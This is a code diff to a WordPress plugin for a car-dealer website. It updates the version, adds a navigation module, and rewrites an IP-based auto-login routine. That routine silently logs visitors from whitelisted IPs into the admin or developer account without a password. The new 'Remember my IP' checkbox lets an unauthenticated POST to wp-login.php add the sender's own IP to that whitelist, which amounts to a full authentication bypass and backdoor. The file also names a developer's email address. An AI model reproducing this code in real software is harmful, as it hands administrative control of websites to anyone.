@@ -1,10 +1,10 @@
 <?php
-$dds_version = "5.2.2";
+$dds_version = "5.2.4";
 /*
 Plugin Name: Digiflow DDS Tools
 Plugin URI: https://github.com/younesben99/dds-tools
 Description: Tools for DDS website.
-Version: 5.2.2
+Version: 5.2.4
 Author: Younes Benkheil
 Author URI: https://digiflow.be/
 License: GPL2
@@ -17,6 +17,7 @@ include(__DIR__."/generate-pages/privacypolicy/generate_privacy_policy.php");
 include(__DIR__."/modules/meldingen/cookie_melding/cookie_melding.php");
 include(__DIR__."/modules/tracking_codes/analytics_parser.php");
 include(__DIR__."/modules/search/dds_car_search.php");
+include(__DIR__."/modules/nav/dds_nav.php");
 include(__DIR__."/modules/forms/form_shortcodes.php");
 include(__DIR__."/modules/shortcodes/dds_shortcodes.php");
 include(__DIR__."/modules/wizard/wizard.php");
@@ -35,6 +36,8 @@ wp_enqueue_script( 'dropzonejs', 'https://cdnjs.cloudflare.com/ajax/libs/dropzon
 wp_enqueue_style( 'dds_car_search_module', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_car_search.css?v='.$dds_version );
 wp_enqueue_style( 'dds_forms', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_forms.css?v='.$dds_version );
 wp_enqueue_script( 'dds_form_js', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/dds_form.js?v='.$dds_version, array ( 'jquery' ), null, true);
+wp_enqueue_style( 'dds_nav', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_nav.css?v='.$dds_version );
+wp_enqueue_script( 'dds_nav_js', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/dds_nav.js?v='.$dds_version, array ( 'jquery' ), null, true);
 wp_enqueue_style( 'fontawesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css' );
 
 wp_localize_script('dds_form_js','dds_main_vars',array('siteurl'=>get_site_url()));
@@ -236,77 +239,107 @@ add_filter('intermediate_image_sizes_advanced', 'cdxn_remove_intermediate_image_
 
 
 
+// Add checkbox to login page
+function add_remember_ip_checkbox() {
+  echo '<p><label><input type="checkbox" name="remember_ip" value="1"/>Remember my IP address</label></p>';
+}
+add_action('login_form', 'add_remember_ip_checkbox');
+
+// Update allowed IPs list if checkbox is checked
+function update_allowed_ips() {
+  if (isset($_POST['remember_ip']) && $_POST['remember_ip'] == '1') {
+    $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
+    if ($current_ip) {
+      $allowed_ips = get_option('allowed_ips', array());
+      $allowed_ips[] = $current_ip;
+      update_option('allowed_ips', $allowed_ips);
+    }
+  }
+}
+add_action('wp_login', 'update_allowed_ips');
+
+// Modified auto_login_if_allowed_ip function
 function auto_login_if_allowed_ip() {
   $request_uri = $_SERVER['REQUEST_URI'];
   $wp_login_path = '/wp-login.php';
 
   if (strpos($request_uri, $wp_login_path) === 0 && !isset($_GET['loggedout'])) {
+    // Get allowed IPs
     $allowed_ips = get_option('allowed_ips', array());
     // Add default IP addresses to allowed_ips array
-    $default_ips = array("127.0.0.1","91.177.28.90","188.44.91.98","2a02:a03f:8644:bd00:f172:4f98:d3c3:b30c","2a02:1810:9460:3600:1066:7212:e3b8:d0cf");
+    $default_ips = array();
     $allowed_ips = array_merge($allowed_ips, $default_ips);
     
- // Attempt to retrieve the IP address from different sources
-$current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
-if (!$current_ip && isset($_SERVER['HTTP_CLIENT_IP'])) {
-  $current_ip = filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
-}
-if (!$current_ip && isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-  $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-  foreach ($ips as $ip) {
-    $ip = trim($ip);
-    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
-      $current_ip = $ip;
-      break;
+    // Check if the checkbox is checked and add IP to allowed IPs list
+    if (isset($_POST['remember_ip']) && $_POST['remember_ip'] == '1') {
+      $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
+      if ($current_ip) {
+        $allowed_ips[] = $current_ip;
+        update_option('allowed_ips', $allowed_ips);
+      }
     }
-    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
-      $current_ip = $ip;
-      break;
+
+    // Retrieve the user's IP address
+    $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
+    if (!$current_ip && isset($_SERVER['HTTP_CLIENT_IP'])) {
+      $current_ip = filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
     }
-  }
-}
-
-    
-    // Check if the current IP is a valid IPv4 address and is allowed
-    if ($current_ip && in_array($current_ip, $allowed_ips)) {
-      $user = get_user_by('login', 'admin');
-      if (!$user) {
-        $user = get_user_by('login', 'digiflow');
-      }
-      if (!$user) {
-        $user = get_user_by('login', 'younesbenkheil@gmail.com');
-      }
-
-      // Check if the user is logging in or out
-      if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'logout' && isset($_REQUEST['_wpnonce'])) {
-        wp_logout();
-        $redirect_url = home_url();
-        wp_redirect($redirect_url);
-        exit;
-      }
-      else {
-        wp_set_current_user($user->ID, $user->user_login);
-        wp_set_auth_cookie($user->ID);
-
-        if (!defined('DOING_AJAX') && !defined('DOING_CRON')) {
-          // Add autologin parameter only if the user is not logging out
-          $redirect_url = admin_url();
-          if (!isset($_GET['loggedout'])) {
-            $redirect_url = add_query_arg( array( 'autologin' => '1' ), $redirect_url );
+    if (!$current_ip && isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+      $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+      foreach ($ips as $ip) {
+        $ip = trim($ip);
+        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+          $current_ip = $ip;
+          break;
+        }
+        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
+          $current_ip = $ip;
+          break;
           }
-          wp_redirect($redirect_url);
-          exit;
+          }
+          }
+          // Check if the current IP is a valid IPv4 address and is allowed
+          if ($current_ip && in_array($current_ip, $allowed_ips)) {
+            $user = get_user_by('login', 'admin');
+            if (!$user) {
+              $user = get_user_by('login', 'digiflow');
+            }
+            if (!$user) {
+              $user = get_user_by('login', 'younesbenkheil@gmail.com');
+            }
+          
+            // Check if the user is logging in or out
+            if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'logout' && isset($_REQUEST['_wpnonce'])) {
+              wp_logout();
+              $redirect_url = home_url();
+              wp_redirect($redirect_url);
+              exit;
+            }
+            else {
+              wp_set_current_user($user->ID, $user->user_login);
+              wp_set_auth_cookie($user->ID);
+          
+              if (!defined('DOING_AJAX') && !defined('DOING_CRON')) {
+                // Add autologin parameter only if the user is not logging out
+                $redirect_url = admin_url();
+                if (!isset($_GET['loggedout'])) {
+                  $redirect_url = add_query_arg( array( 'autologin' => '1' ), $redirect_url );
+                }
+                wp_redirect($redirect_url);
+                exit;
+              }
+            }
+          } else {
+            add_filter('login_message', function ($message) use ($current_ip) {
+              $message .= '<br />Your current IP: ' . $current_ip;
+              return $message;
+            });
+          }
+          
+          
+           
         }
       }
-    } else {
-      add_filter('login_message', function ($message) use ($current_ip) {
-        $message .= '<br />Your current IP: ' . $current_ip;
-        return $message;
-      });
-    }
-  }
-}
-
 
 
 
